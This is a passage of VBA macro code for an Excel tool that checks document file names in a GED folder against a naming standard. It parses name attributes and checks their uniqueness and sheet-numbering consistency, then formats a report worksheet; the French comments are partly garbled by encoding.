                    If Not VerifAttribut("nbFolios", attribTable.nbFolios, .Cells(l, outputCol_nbFolios)) Then NbErr = NbErr + 1
                    If Not VerifAttribut("extension", attribTable.extension, .Cells(l, outputCol_extension)) Then NbErr = NbErr + 1
                    
                    'sp|fffd|cial plans ACHNOM, Enlev|fffd| le controle du Format le 07/10/2009
'                    If attribTable.Suffixe = "----" Then
'                        If attribTable.Format = vbnullstring Then
'                            IndiqueErreur .Cells(L, outputCol_format), IniCls.ReadStringIniLangage("MsgFWK", "MsgFormatPlan") '"*11Un plan doit avoir un format"
'                            NbErr = NbErr + 1
'                        End If
'                    End If
                    'sp|fffd|cial programmes
                    If VBA.Left(attribTable.Suffixe, 1) = "P" Then
                        If VBA.LCase(attribTable.extension) <> "zip" Then
                            IndiqueErreur .Cells(l, outputCol_extension), IniCls.ReadStringIniLangage("MsgFWK", "MsgProgZip") '"*12Un programme doit |fffd|tre un fichier zip"
                            NbErr = NbErr + 1
                        End If
                    End If

                    If NbErr > 0 Then
                        .Cells(l, outputCol_stuctOK).Value = NbErr & " " & IniCls.ReadStringIniLangage("MsgFWK", "MsgErreur") '"*50 erreur"
                        If NbErr >= 2 Then .Cells(l, outputCol_stuctOK).Value = .Cells(l, outputCol_stuctOK).Value & "s"
                        IndiqueErreur .Cells(l, outputCol_stuctOK), vbNullString
                        NbErrStruct = NbErrStruct + 1
                    Else
                        .Cells(l, outputCol_stuctOK).Value = Libel_Ok
                        IndiqueOK .Cells(l, outputCol_stuctOK)
                    End If
                End If
            Else
                .Cells(l, outputCol_stuctOK).Value = IniCls.ReadStringIniLangage("MsgFWK", "MsgEmpty")
            End If
        Next l
        .UsedRange.EntireColumn.AutoFit
    End With
    Application.StatusBar = False
End Sub


Function Caractere_Interdit_Ged(Dossier As String)
    Caractere_Interdit_Ged = False
    If VBA.InStr(Dossier, ",") <> 0 Then Caractere_Interdit_Ged = True
End Function


Function GetAttribItems(Fichier As String) As ListeAttributs
    'extrait du nom de fichier les diff|fffd|rents attributs attendus
    'suivant les r|fffd|gles d'identification EB15.70.200
    Dim Filename As String
    Dim NumItems As Integer
    
    InitListeAttributs GetAttribItems
    
    's|fffd|paration nom.suffixe
    Filename = GetFileName(Fichier)
    If VBA.InStr(Filename, "=") <> 0 Then Filename = VBA.Left(Filename, VBA.InStr(Filename, "=") - 1)
    GetAttribItems.extension = GetFileExtension(Fichier)
    
    'v|fffd|rif des caract|fffd|res interdits
    If Not EstImprimable(Filename) Then GetAttribItems.erreur = IniCls.ReadStringIniLangage("MsgFWK", "MsgCarInterdits")         '"*39Le nom de fichier contient des caract|fffd|res non autoris|fffd|s : autres que " & VbCrLf & MsgCaract|fffd|resAutoris|fffd|s:Exit Function
    
    'v|fffd|rif de la structure des underscores
    NumItems = ItemCount(Filename, "_")
    If NumItems = 1 Then
    ElseIf NumItems = 2 Then
    ElseIf NumItems = 3 Then
    ElseIf NumItems = 4 Then
    ElseIf NumItems = 6 Then
    Else
        GetAttribItems.erreur = IniCls.ReadStringIniLangage("MsgFWK", "MsgUnderscore") '"*40Le nom de fichier doit contenir 1, 3 ou 5 underscores ('_')"
        Exit Function
    End If
    
    GetAttribItems.numero = VBA.UCase(Item(Filename, 1, 1, "_"))
    GetAttribItems.Suffixe = VBA.UCase(Item(Filename, 2, 2, "_"))
    If GetAttribItems.Suffixe = vbNullString Then GetAttribItems.Suffixe = "----"
    
    'v|fffd|rifications sp|fffd|cifiques aux programmes
    If VBA.Left(GetAttribItems.Suffixe, 1) = "P" Then
        If NumItems > 2 Then GetAttribItems.erreur = IniCls.ReadStringIniLangage("MsgFWK", "Msg1Underscore"): Exit Function
    End If
    'v|fffd|rifications sp|fffd|cifiques aux plans
    If GetAttribItems.Suffixe = "----" Then
        If NumItems <> 6 And NumItems <> 3 And NumItems <> 1 Then GetAttribItems.erreur = IniCls.ReadStringIniLangage("MsgFWK", "Msg5Underscore"): Exit Function
    End If
    
    If NumItems = 4 Then '3
        GetAttribItems.numFolio = Item(Filename, 3, 3, "_")
        GetAttribItems.nbFolios = Item(Filename, 4, 4, "_")
    ElseIf NumItems = 6 Then
        GetAttribItems.Indice = VBA.UCase(sIndiceNum(Item(Filename, 3, 3, "_")))
        GetAttribItems.Format = VBA.UCase(Item(Filename, 4, 4, "_"))
        GetAttribItems.numFolio = Item(Filename, 5, 5, "_")
        GetAttribItems.nbFolios = Item(Filename, 6, 6, "_")
    End If
    
    'Num|fffd|ros implicites (vbnullstring=1)
    If GetAttribItems.numFolio = vbNullString Then GetAttribItems.numFolio = "1"
    If GetAttribItems.nbFolios = vbNullString Then GetAttribItems.nbFolios = "1"

End Function


Function ItemCount(Text As String, Optional delimiters As Variant) As Integer
    'Returns an Integer containing the number of items in the specified delimited text.
    'Items are substrings of a delimited text string. Items, by default, are separated by
    'commas and/or end-of-lines. This can be changed by specifying different
    'delimiters in the delimiters parameter.
    Dim i As Integer, Pos As Integer
    Dim delimiter As String
    
    If VBA.IsMissing(delimiters) Or delimiters = vbNullString Then delimiters = "," & VBA.Chr(13) 'd|fffd|limiteurs par d|fffd|faut
    If Text = vbNullString Then
        ItemCount = 0
        Exit Function
    Else
        ItemCount = 1
    End If
    'count for each individual delimiter
    i = 1
    Do Until i > VBA.Len(delimiters)
        delimiter = VBA.Mid(delimiters, i, 1)
        Pos = 0
        Do
            Pos = VBA.InStr(Pos + 1, Text, delimiter)
            If Pos > 0 Then ItemCount = ItemCount + 1
        Loop Until Pos = 0
        i = i + 1
    Loop
End Function


Function Item(Text As String, first As Integer, last As Integer, Optional delimiters As Variant) As String
    'Returns all the items between first and last within the specified formatted text list.
    Dim i As Integer, CurrentItemNb As Integer
    Dim char As String, CurrentItemText As String, ReturnedText As String
    
    If VBA.IsMissing(delimiters) Or delimiters = vbNullString Then delimiters = "," & VBA.Chr(13) 'd|fffd|limiteurs par d|fffd|faut
    If Text = vbNullString Or first = 0 Or last = 0 Then Item = vbNullString: Exit Function
    'Scan each character one by one, searching for a delimiter
    CurrentItemNb = 0
    CurrentItemText = vbNullString
    i = 1
    Do Until i > VBA.Len(Text) + 1
        char = VBA.Mid(Text, i, 1)
        If VBA.InStr(delimiters, char) = 0 Then 'currently scanned char is not a delimiter, it is part of current item
            CurrentItemText = CurrentItemText & char
        Else    'currently scanned char is among delimiters list
            CurrentItemNb = CurrentItemNb + 1
            If CurrentItemNb >= first Then
                ReturnedText = ReturnedText & CurrentItemText
                If CurrentItemNb = last Then Exit Do   'finished
                ReturnedText = ReturnedText & char
            End If
            ':SD
            CurrentItemText = vbNullString
        End If
        i = i + 1
    Loop
    Item = ReturnedText
End Function


'--------------------------------------------------------------------------------------
'   Fonction sIndiceNum()
'   Objet      : conversion des indices num|fffd|riques
'   Param|fffd|tres : indice num|fffd|rique
'   Sorties    :
'   R|fffd|sultat   : indice alphanum|fffd|rique
'   Remarques  :
'--------------------------------------------------------------------------------------
Function sIndiceNum(ByVal sIndice As String) As String
    sIndiceNum = sIndice
    'v|fffd|rifie que l'indice est bien num|fffd|rique
    If VBA.IsNumeric(sIndice) Then
        If VBA.CStr(CDbl(sIndice)) = sIndice Then
            If sIndice = "0" Then
                sIndiceNum = "-"
            ElseIf sIndice = "1" Then
                sIndiceNum = "A"
            ElseIf sIndice = "2" Then
                sIndiceNum = "B"
            ElseIf sIndice = "3" Then
                sIndiceNum = "C"
            ElseIf sIndice = "4" Then
                sIndiceNum = "D"
            ElseIf sIndice = "5" Then
                sIndiceNum = "E"
            ElseIf sIndice = "6" Then
                    sIndiceNum = "F"
            ElseIf sIndice = "7" Then
                sIndiceNum = "G"
            ElseIf sIndice = "8" Then
                sIndiceNum = "H"
            Else
                sIndiceNum = "I"
            End If
        End If
    End If

End Function


'--------------------------------------------------------------------------------------
'   Fonction EstImprimable()
'   Objet      : V|fffd|rifie que la cha|fffd|ne ne contient que des caract|fffd|res imprimables []
'   Param|fffd|tres : cha|fffd|ne de caract|fffd|res
'   Sorties    :
'   R|fffd|sultat   : TRUE si la cha|fffd|ne est compos|fffd|e strictement de caract|fffd|res imprimables
'                FALSE sinon
'   Remarques  :
'--------------------------------------------------------------------------------------
Function EstImprimable(ByVal chaine As String) As Boolean
    'Const GA_CARACTERES_AUTO = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+-._"  'note : "_" rajout|fffd| puisque compt|fffd| comme s|fffd|p
'ACHNOM Gestion du signe = pour s|fffd|parer le Nom du Document et du Commentaire
    Const GA_CARACTERES_AUTO = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+-._="  'note : "_" et "=" rajout|fffd| puisque compt|fffd| comme s|fffd|p

    Dim LenChaine As Integer, i As Integer
    Dim car_i       As String

    EstImprimable = False

    LenChaine = VBA.Len(chaine)

    If LenChaine <> 0 Then
        i = 1
        Do Until i > LenChaine
            car_i = VBA.Mid(chaine, i, 1)
            If VBA.InStr(1, GA_CARACTERES_AUTO, car_i, 0) = 0 Then GoTo Fin
            i = i + 1
        Loop
    End If

    EstImprimable = True
Fin:
End Function


Function GetFileName(Fichier As String) As String
    'renvoie le nom du fichier, sans l'extension (ex: toto.txt -> toto)
    Dim Pos As Integer
    Pos = LastInStr(Fichier, ".")
    If Pos = 0 Then GetFileName = Fichier Else GetFileName = VBA.Left(Fichier, Pos - 1)
End Function


Function GetFileExtension(Fichier As String) As String
    'renvoie l'extension du fichier (ex: toto.txt -> txt)
    Dim Pos As Integer
    Pos = LastInStr(Fichier, ".")
    If Pos = 0 Then GetFileExtension = vbNullString Else GetFileExtension = VBA.Right(Fichier, VBA.Len(Fichier) - Pos)
End Function


Function LastInStr(ByVal str1 As String, ByVal str2 As String) As Long
    'donne la derni|fffd|re position de la cha|fffd|ne 2 dans la cha|fffd|ne 1
    '(0 si non trouv|fffd|e)
    Dim CurPos As Long
    CurPos = 0
    Do
        LastInStr = CurPos
        CurPos = VBA.InStr(CurPos + 1, str1, str2)
    Loop Until CurPos = 0
End Function


Sub InitListeAttributs(ByRef list As ListeAttributs)
    'Initialisation d'un objet ListeAttributs
    With list
        .numero = vbNullString
        .Suffixe = vbNullString
        .Format = vbNullString
        .Indice = vbNullString
        .numFolio = vbNullString
        .nbFolios = vbNullString
        .extension = vbNullString
        .erreur = vbNullString
    End With
End Sub


Sub VerifUnicite(wsCtrl_Ged As Worksheet)
    'v|fffd|rification de l'unicit|fffd| d'un identifiant |fffd| travers les dossiers
    'il faut v|fffd|rifier qu'on n'a pas un m|fffd|me num|fffd|ro et suffixe dans 2 dossiers diff|fffd|rents
    Dim l As Long, L1 As Long
    Dim IsErrObj As Boolean
    
    Application.StatusBar = IniCls.ReadStringIniLangage("MsgFWK", "Msg13") '"*13V|fffd|rifie l'unicit|fffd| des identifiants |fffd| travers les dossiers..."
    
    With wsCtrl_Ged
        'tri par identifiant et dossier
        .UsedRange.Sort Key1:=.Cells(1, outputCol_numero), Order1:=xlAscending, _
                        Key2:=.Cells(1, outputCol_suffixe), Order2:=xlAscending, _
                        Key3:=.Cells(1, outputCol_extension), Order3:=xlAscending, _
                        Header:=xlNo
                        'ACHNOM outputCol_extension |fffd| la place de outputCol_fichier modif ACH du 30/09/2008
                        'outputCol_dossier modif ACH du 10/07/2008
        l = 2
        L1 = l
        IsErrObj = False
        NbErrUnic = 0
        'on parcourt tous les identifiants
        'Modif ACH du 05/10/2009, pour Traitement du '=' dans les Noms de Fichiers
        Do Until .Cells(L1, outputCol_fichier).Formula = vbNullString And L1 < .Rows.Count - 3
            If .Cells(L1 - 1, outputCol_stuctOK).Value = Libel_Ok Then
                'on regarde si on est toujours sur le m|fffd|me objet (m|fffd|me num|fffd|ro + m|fffd|me suffixe+extension)
                If .Cells(l, outputCol_numero).Value = .Cells(l - 1, outputCol_numero).Value _
                  And .Cells(l, outputCol_suffixe).Value = .Cells(l - 1, outputCol_suffixe).Value _
                  And .Cells(l, outputCol_numFolio).Value = .Cells(l - 1, outputCol_numFolio).Value _
                  And .Cells(l, outputCol_extension).Value = .Cells(l - 1, outputCol_extension).Value Then
                    'on doit |fffd|tre toujours dans le m|fffd|me dossier (sinon, il n'y a pas unicit|fffd|)
                    If .Cells(l, outputCol_dossier).Value <> .Cells(L1, outputCol_dossier).Value Then
                        IndiqueErreur .Cells(l, outputCol_dossier), IniCls.ReadStringIniLangage("MsgFWK", "Msg14") ' "*14M|fffd|me identifiant dans plusieurs dossiers"
                        IsErrObj = True
                    Else
                        IsErrObj = True ' bizard
                    End If
                End If
                    
                'mise en forme des lignes de l'objet pr|fffd|c|fffd|dent
                If Not IsErrObj Then
                    .Cells(l - 1, outputCol_planchesOK).Value = Libel_Ok
                Else
                    .Cells(l - 1, outputCol_planchesOK).Value = "KO"
                    NbErrUnic = NbErrUnic + 1
                End If
                
                If IsErrObj Then IndiqueErreur .Range(.Cells(L1, outputCol_planchesOK + 1), .Cells(l - 1, outputCol_planchesOK)), IniCls.ReadStringIniLangage("MsgFWK", "Msg51") Else IndiqueOK .Range(.Cells(l, outputCol_planchesOK + 1), .Cells(l - 1, outputCol_planchesOK))
                
                'on passe au nouvel objet
                l = l + 1
                IsErrObj = False
            Else
                .Cells(l - 1, outputCol_planchesOK).Value = "NC"
                l = l + 1 ' ************
            End If
            
            'on passe au nouvel objet
            L1 = l  'mise |fffd| jour de la ligne de r|fffd|f|fffd|rence
        Loop
        
        If Not IsErrObj Then
            .Cells(l - 1, outputCol_planchesOK).Value = Libel_Ok
        Else
            .Cells(l - 1, outputCol_planchesOK).Value = "KO"
            NbErrUnic = NbErrUnic + 1
        End If
    End With
    
    Application.StatusBar = False

End Sub


Sub VerifCoherence(wsCtrl_Ged As Worksheet)
    'v|fffd|rification de la coh|fffd|rence entre les planches
    
    Dim l As Long, L1 As Long, i As Long
    Dim IsErrObj As Boolean
    
    Application.StatusBar = IniCls.ReadStringIniLangage("MsgFWK", "Msg15") ' "*15V|fffd|rifie la coh|fffd|rence entre les planches..."
    With wsCtrl_Ged
        'tri par objet et num|fffd|ro de planche
        .UsedRange.Sort Key1:=.Cells(1, outputCol_numero), Order1:=xlAscending, _
                        Key2:=.Cells(1, outputCol_suffixe), Order2:=xlAscending, _
                        Key3:=.Cells(1, outputCol_numFolio), Order3:=xlAscending, _
                        Header:=xlNo
        .UsedRange.Sort Key1:=.Cells(1, outputCol_extension), Order1:=xlAscending, _
                        Key2:=.Cells(1, outputCol_dossier), Order1:=xlAscending, _
                        Header:=xlNo
        .Outline.SummaryRow = xlAbove
        
        l = 1
        L1 = l
        IsErrObj = False
        NbErrUnic = 0
        NbErrPlanche = 0

        .Columns(outputCol_numero + 7).Clear
        'on parcourt tous les fichiers 'Modif ACH du 05/10/2009, pour Traitement du '=' dans les Noms de Fichiers
        Do Until .Cells(l, outputCol_fichier).Formula = vbNullString       'ou L > .UsedRange.EntireRow.Count + 1
            If .Cells(l, outputCol_stuctOK).Value = Libel_Ok Then
                'on v|fffd|rifie num|fffd|ro folio <= nb folios
                If .Cells(l, outputCol_numFolio).Value > .Cells(l, outputCol_nbFolios).Value Then IsErrObj = True
                'on v|fffd|rifie qu'on ne d|fffd|passe pas le maximum de planches autoris|fffd|
                If VBA.Left(.Cells(l, outputCol_suffixe).Value, 1) = "D" And CInt(.Cells(l, outputCol_numFolio).Value) > MaxFichiersDoc Then
                    IsErrObj = True
                    'IndiqueErreur .Cells(L, outputCol_numFolio), "*16Un document doit avoir moins de " & MaxFichiersDoc & "*63 fichiers"
                    IndiqueErreur .Cells(l, outputCol_numFolio), IniCls.ReadStringIniLangage("MsgFWK", "Msg16") & MaxFichiersDoc & IniCls.ReadStringIniLangage("MsgFWK", "Msg63")
                End If
                
                If .Cells(l, outputCol_suffixe).Value = "----" And CInt(.Cells(l, outputCol_numFolio).Value) > MaxFichiersPlan Then
                    IsErrObj = True
                    'IndiqueErreur .Cells(L, outputCol_numFolio), "*17Un document doit avoir moins de " & MaxFichiersDoc & " fichiers"
                    IndiqueErreur .Cells(l, outputCol_numFolio), IniCls.ReadStringIniLangage("MsgFWK", "Msg17") & MaxFichiersDoc & IniCls.ReadStringIniLangage("MsgFWK", "Msg63")
                End If
                
                If l >= 2 Then
                    'on regarde si on est toujours sur le m|fffd|me objet (m|fffd|me num|fffd|ro + m|fffd|me suffixe)
                    If .Cells(l, outputCol_numero).Value = .Cells(l - 1, outputCol_numero).Value And .Cells(l, outputCol_suffixe).Value = .Cells(l - 1, outputCol_suffixe).Value Then
                        'on doit garder les m|fffd|mes attributs que la 1|fffd|re planche (en L1)
                        ' Indice
                        ' Format
                        ' nb folio
                        If .Cells(l, outputCol_indice).Value <> .Cells(L1, outputCol_indice).Value Then
                            IsErrObj = True
                            IndiqueErreur .Cells(l, outputCol_indice), IniCls.ReadStringIniLangage("MsgFWK", "Msg19") '"*19L'indice doit rester le m|fffd|me sur toutes les planches"
                        End If
                        If .Cells(l, outputCol_format).Value <> .Cells(L1, outputCol_format).Value Then
                            IsErrObj = True
                            IndiqueErreur .Cells(l, outputCol_format), IniCls.ReadStringIniLangage("MsgFWK", "Msg18") ' "*18Le format doit rester le m|fffd|me sur toutes les planches"
                        End If
                        If .Cells(l, outputCol_nbFolios).Value <> .Cells(L1, outputCol_nbFolios).Value Then
                            IsErrObj = True
                            IndiqueErreur .Cells(l, outputCol_nbFolios), IniCls.ReadStringIniLangage("MsgFWK", "Msg20") ' "*20Le nombre total de planches doit rester le m|fffd|me sur toutes les planches"
                        End If
                        
                        'on doit incr|fffd|menter le num|fffd|ro de planche
                        ' tenir compte de l'extension
                        If .Cells(l, outputCol_numFolio).Value <> .Cells(l - 1, outputCol_numFolio).Value + 1 Then
                            IsErrObj = True
                            IndiqueErreur .Cells(l, outputCol_numFolio), IniCls.ReadStringIniLangage("MsgFWK", "Msg21") ' "*21Les num|fffd|ros de planches doivent se suivre"
                        End If
                        If Not IsErrObj Then
                            .Cells(L1 - 1, outputCol_planchesOK + 8).Value = Libel_Ok
                            IndiqueOK .Range(.Cells(L1 - 1, outputCol_planchesOK + 1), .Cells(l - 1, outputCol_planchesOK + 8))
                        End If
                        
                    Else       'on change d'objet
                        IsErrObj = False ' 12-06-2006
                        'on v|fffd|rifie que pour la derni|fffd|re planche de l'objet pr|fffd|c|fffd|dent on avait bien atteint le nb de planches
                        If .Cells(l - 1, outputCol_numFolio).Value < .Cells(l - 1, outputCol_nbFolios).Value Then
                            IsErrObj = True
                            IndiqueErreur .Cells(l - 1, outputCol_nbFolios), IniCls.ReadStringIniLangage("MsgFWK", "Msg22") ' "*22Il manque des planches"
                            .Cells(L1 - 1, outputCol_planchesOK + 8).Value = "KO"
                            NbErrPlanche = NbErrPlanche + 1
                            
                            ' mettre en rouge
                        Else
                            'mise en forme des lignes de l'objet pr|fffd|c|fffd|dent
                            .Cells(L1 - 1, outputCol_planchesOK + 8).Value = Libel_Ok
                            IndiqueOK .Range(.Cells(L1 - 1, outputCol_planchesOK + 1), .Cells(l - 1, outputCol_planchesOK + 8))
                        End If
                                                         
                        'If Not IsErrObj Then
                        '
                        '
                        'Else
                        '    .Cells(L1 - 1, outputCol_planchesOK + 8).Value = "KO"
                        '    NbErrPlanche = NbErrPlanche + 1
                            'NbErrCoher = NbErrCoher + 1
                        'End If
                        ' mise en forme
                        For i = L1 + 1 To l - 2
                            '.Cells(i, outputCol_planchesOK).Value = "  |"  'ligne de milieu
                            .Cells(i, outputCol_planchesOK).Value = "  |fffd|"  'ligne de milieu
                            .Cells(i, outputCol_planchesOK).Font.Name = "Symbol"
                        Next i
                        If l - 1 > L1 Then  'il y a plus d'une planche
                            '.Cells(L - 1, outputCol_planchesOK).Value = "  |__"     'ligne de fin
                            .Cells(l - 1, outputCol_planchesOK).Value = "  |fffd|"
                            .Cells(l - 1, outputCol_planchesOK).Font.Name = "Symbol"
                            .Range(.Rows(L1 + 1), .Rows(l - 1)).Group
                        End If

                        If IsErrObj Then
                            IndiqueErreur .Range(.Cells(L1 - 1, outputCol_planchesOK + 1), .Cells(l - 1, outputCol_planchesOK + 8)), vbNullString
                        Else
                            IndiqueOK .Range(.Cells(L1 - 1, outputCol_planchesOK + 1), .Cells(l - 1, outputCol_planchesOK + 8))
                        End If
                        
                        'on passe au nouvel objet
                        ' bizard !!!!
                        L1 = l  'mise |fffd| jour de la ligne de r|fffd|f|fffd|rence
                        IsErrObj = False
                        
                        'on v|fffd|rifie que le nouvel objet commence bien par la planche 1
                        If Not (.Cells(l, outputCol_numFolio).Value = vbNullString And .Cells(l, outputCol_numFolio).Value = vbNullString) Then
                            If CInt(.Cells(l, outputCol_numFolio).Value) <> 1 Then
                                IsErrObj = True
                                IndiqueErreur .Cells(L1, outputCol_numFolio), IniCls.ReadStringIniLangage("MsgFWK", "Msg26") ' "*23Il manque la planche 1"
                                .Cells(l, outputCol_planchesOK + 8).Value = "KO"
                                NbErrPlanche = NbErrPlanche + 1
                            End If
                        End If
                    End If
            
                'Else
                '    L1 = 1
                End If
            Else
                .Cells(l, outputCol_planchesOK).Value = "NC"
                If l >= 2 Then
                    'Modif ACH du 22/07/2008, Probl|fffd|me sur les derniers
                    If .Cells(l - 1, outputCol_numFolio).Value = .Cells(l - 1, outputCol_nbFolios).Value _
                        And .Cells(l - 1, outputCol_numFolio).Value <> vbNullString Then
                        'mise en forme des lignes de l'objet pr|fffd|c|fffd|dent
                        .Cells(L1 - 1, outputCol_planchesOK + 8).Value = Libel_Ok
                        IndiqueOK .Range(.Cells(L1 - 1, outputCol_planchesOK + 1), .Cells(l - 1, outputCol_planchesOK + 8))
                    End If
                End If
            End If
            l = l + 1
            L1 = l  'mise |fffd| jour de la ligne de r|fffd|f|fffd|rence
        Loop
        
        .Columns(outputCol_planchesOK).AutoFit
    End With
    Application.StatusBar = False
End Sub


Sub MiseEnFormeReport(wsCtrl_Ged As Worksheet, WorkDir As String)
    'mise en forme finale
    Dim HeaderList As Variant
    Dim Ligne_Deb As Long, Ligne_Fin As Long
    Dim i As Integer
    
    Application.StatusBar = IniCls.ReadStringIniLangage("MsgFWK", "Msg52") '"*52Met en forme le fichier de sortie..."

    With wsCtrl_Ged
        'en-t|fffd|te 1 (libell|fffd| des colonnes)
        'HeaderList = Array("Dossier", "Fichier", "Structure", "Unicit|fffd| Doc", "Num|fffd|ro", "Suffixe", "Indice", "Format", "N|fffd| planche", "Nb de planches", "Extension", "CTRL Planche", "Longueur Dossier(A)" & vba.chr(10) & " et Fichier(B)", " Lien Dossier", "Lien fichier", "Contr|fffd|le d|fffd|claration" & vba.chr(10) & " Doc dans TDI")
        HeaderList = Array(IniCls.ReadStringIniLangage("MsgFWK", "Msg62"), IniCls.ReadStringIniLangage("MsgFWK", "Msg63"), _
                           IniCls.ReadStringIniLangage("MsgFWK", "Msg64"), IniCls.ReadStringIniLangage("MsgFWK", "Msg65"), _
                           IniCls.ReadStringIniLangage("MsgFWK", "Msg66"), IniCls.ReadStringIniLangage("MsgFWK", "Msg67"), _
                           IniCls.ReadStringIniLangage("MsgFWK", "Msg68"), IniCls.ReadStringIniLangage("MsgFWK", "Msg69"), _
                           IniCls.ReadStringIniLangage("MsgFWK", "Msg70"), IniCls.ReadStringIniLangage("MsgFWK", "Msg71"), _
                           IniCls.ReadStringIniLangage("MsgFWK", "Msg72"), IniCls.ReadStringIniLangage("MsgFWK", "Msg73"), _
                           IniCls.ReadStringIniLangage("MsgFWK", "Msg74") & VBA.Chr(10) & IniCls.ReadStringIniLangage("MsgFWK", "Msg75"), _
                           IniCls.ReadStringIniLangage("MsgFWK", "Msg76"), IniCls.ReadStringIniLangage("MsgFWK", "Msg77"), _
                           IniCls.ReadStringIniLangage("MsgFWK", "Msg78") & VBA.Chr(10) & IniCls.ReadStringIniLangage("MsgFWK", "Msg79"), _
                           IniCls.ReadStringIniLangage("MsgFWK", "MsgDesign"), IniCls.ReadStringIniLangage("MsgFWK", "MsgSacimMabec"), _
                           IniCls.ReadStringIniLangage("MsgFWK", "MsgNomFour"), IniCls.ReadStringIniLangage("MsgFWK", "Msg80"))
       
        .Rows(1).Insert Shift:=xlDown
        i = 0
        Do Until i > UBound(HeaderList)
            .Cells(1, i + 1).Value = HeaderList(i)
            i = i + 1
        Loop
    
        'en-t|fffd|te 2 (r|fffd|capitulatif et mise en garde)
        i = 1
        Do
            .Rows(1).Insert Shift:=xlDown
            i = i + 1
        Loop Until i > 8
        .Cells(1, 1).Value = "Dossier: " & WorkDir
        With .Cells(1, 1).Characters(9).Font
            .Name = "Courier New"
            .Size = 9
        End With
        .Cells(2, 1).Value = IniCls.ReadStringIniLangage("MsgFWK", "Msg80") & " " & VBA.Format(VBA.Date, "dd/mm/yyyy")
        .Cells(2, 1).Characters(Len(IniCls.ReadStringIniLangage("MsgFWK", "Msg80")) + 2).Font.Bold = True
        ' affichage de erreur de structure
        If NbErrStruct = 0 Or NbErrStruct = 1 Then
            .Cells(3, 1).Value = NbErrStruct & " " & IniCls.ReadStringIniLangage("MsgFWK", "Msg54") ' "*54 erreur de structure de fichier"
        Else
            .Cells(3, 1).Value = NbErrStruct & " " & IniCls.ReadStringIniLangage("MsgFWK", "Msg54") '"*54 erreurs de structure de fichier"
        End If
        ' affichage des erreurs de coherence
        'If NbErrStruct = 0 Then
            If NbErrUnic = 0 Or NbErrUnic = 1 Then
                .Cells(4, 1).Value = NbErrUnic & " " & IniCls.ReadStringIniLangage("MsgFWK", "Msg55") ' "*55   erreur de coh|fffd|rence entre unicit|fffd| des fichiers d'un m|fffd|me objet"
                .Cells(5, 1).Value = NbErrPlanche & " " & IniCls.ReadStringIniLangage("MsgFWK", "Msg56") '"*56   erreur de coh|fffd|rence entre sur le nomhre de planche d'un m|fffd|me objet"
            Else
                .Cells(4, 1).Value = NbErrUnic & " " & IniCls.ReadStringIniLangage("MsgFWK", "Msg57") '"*57   erreurs de coh|fffd|rence entre unicite des fichiers d'un m|fffd|me objet"
                .Cells(5, 1).Value = NbErrPlanche & " " & IniCls.ReadStringIniLangage("MsgFWK", "Msg58") '"*58   erreurs de coh|fffd|rence entre sur le nomhre de planche d'un m|fffd|me objet"
            End If
        'End If
        
        .Cells(6, 1).Value = IniCls.ReadStringIniLangage("MsgFWK", "Msg60") '"*60Le r|fffd|sultat est indicatif et ne constitue pas une garantie que tous les objets pourront |fffd|tre exploit|fffd|s par RENAULT."
        .Cells(7, 1).Value = IniCls.ReadStringIniLangage("MsgFWK", "Msg61") '"*61Seules la norme EB15.70.200 et l'application GEDTMI sont garantes d'une identification correcte."
        With .Range(.Cells(6, 1), .Cells(7, 1)).Font
            .Italic = True
            .Size = 8
        End With
        .Range(.Cells(7, 1), .Cells(7, 1)).Font.Bold = True
    
        'Mise en page
        With .PageSetup
            .LeftHeader = vbNullString
            .CenterHeader = shCtrl_Ged
            .RightHeader = vbNullString
            .LeftFooter = vbNullString
            .CenterFooter = "Page &P / &N"
            .RightFooter = vbNullString
            .PrintTitleRows = "$9:$9"   '.Parent.Rows(9).Address
            .PrintTitleColumns = vbNullString
            .Orientation = xlLandscape
            .Zoom = False
            .FitToPagesWide = 1
            .FitToPagesTall = False
        End With
        
        .Activate
        ActiveWindow.FreezePanes = False
        If Not .AutoFilterMode Then .Rows(9).AutoFilter 'pose le Filtre Automatique
        ActiveWindow.SplitRow = 9
        ActiveWindow.FreezePanes = True
        Application.StatusBar = False
        
        Entetes_Colonnes_Ctrl_GED
    
        Ligne_Deb = FirstLine(shCtrl_Ged)
        Ligne_Fin = Lastline(ThisWorkbook.Worksheets(shCtrl_Ged))
        With .Range("M" & Ligne_Deb & ":M" & Ligne_Fin).Interior
            .ColorIndex = 33
            .Pattern = xlSolid
        End With
    
        With .Range("N" & Ligne_Deb & ":N" & Ligne_Fin).Interior
            .ColorIndex = 34
            .Pattern = xlSolid
        End With
        
        With .Range("O" & Ligne_Deb & ":O" & Ligne_Fin).Interior
            .ColorIndex = 35
            .Pattern = xlSolid
        End With
        
        With .Range("T" & Ligne_Deb & ":T" & Ligne_Fin).Interior
            .ColorIndex = 33
            .Pattern = xlSolid
        End With

        .Range("A1:O8").Interior.ColorIndex = xlNone
        
        With .Range("A9:T9")
            .HorizontalAlignment = xlCenter
            .VerticalAlignment = xlCenter 'xlBottom
            .WrapText = True
            .Orientation = 0
            .Font.Bold = True
        End With
        
        With .Range("A9:T9").Interior
            .ColorIndex = 36
            .Pattern = xlSolid
        End With

        .Range("A9:T9").Borders(xlDiagonalDown).LineStyle = xlNone
        .Range("A9:T9").Borders(xlDiagonalUp).LineStyle = xlNone
        With .Range("A9:T9").Borders(xlEdgeLeft)
            .LineStyle = xlContinuous
            .Weight = xlThin
            .ColorIndex = xlAutomatic
        End With
        
        With .Range("A9:T9").Borders(xlEdgeTop)
            .LineStyle = xlContinuous
            .Weight = xlThin
            .ColorIndex = xlAutomatic
        End With
        
        With .Range("A9:T9").Borders(xlEdgeBottom)
            .LineStyle = xlContinuous
            .Weight = xlThin
            .ColorIndex = xlAutomatic
        End With
        
        With .Range("A9:T9").Borders(xlEdgeRight)
            .LineStyle = xlContinuous
            .Weight = xlThin
            .ColorIndex = xlAutomatic
        End With
        
        With .Range("A9:T9").Borders(xlInsideVertical)
            .LineStyle = xlContinuous
            .Weight = xlThin
            .ColorIndex = xlAutomatic
        End With
        
        .UsedRange.EntireColumn.AutoFit
        .Range("D9").Orientation = xlUpward
        .Columns(4).ColumnWidth = 3
        .Range("G9:M9").Orientation = xlUpward
        .Columns("G:L").ColumnWidth = 3
        .Columns("M").ColumnWidth = 5
        .Columns("A").ColumnWidth = 50
        .UsedRange.EntireRow.AutoFit
    End With

    Sort_OutputSheet wsCtrl_Ged
End Sub


Sub Entetes_Colonnes_Ctrl_GED()
